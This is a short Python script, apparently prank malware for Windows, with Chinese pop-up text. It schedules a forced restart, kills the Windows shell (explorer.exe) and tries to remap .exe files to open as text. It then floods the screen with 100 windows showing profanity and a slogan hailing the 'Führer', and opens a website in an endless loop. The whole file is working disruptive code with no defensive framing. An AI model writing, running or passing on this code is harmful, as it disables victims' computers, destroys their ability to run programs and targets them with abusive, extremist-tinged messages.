import webbrowser
import tkinter
from tkinter import messagebox
import random
import os
import time
import tkinter as tk
import threading
os.system('shutdown -r -t 360')
tkinter.messagebox.showinfo("提示",
                            "你被 澡 了")
os.system('taskkill /im explorer.exe /f >nul 2>nul')
os.system('assoc.exe=txtfile')
def boom():
    window = tk.Tk()
    width = window.winfo_screenwidth()
    height = window.winfo_screenheight()
    a = random.randrange(0, width)
    b = random.randrange(0, height)
    window.title('ERROR')
    window.geometry("200x50" + "+" + str(a) + "+" + str(b))
    tk.Label(window, text='FUCK', bg='red',
             font=('Arial', 17), width=20, height=4).pack()
    window.mainloop()
    tkinter.messagebox.showerror("ERROR",
                                 "FUCK!FUCK!元首万岁！")
    



threads = []
for i in range(100):
    t = threading.Thread(target=boom)
    threads.append(t)
    time.sleep(0.1)
    threads[i].start()
    webbrowser.open('seanshen.ysepan.com')
while True:
    webbrowser.open('seanshen.ysepan.com')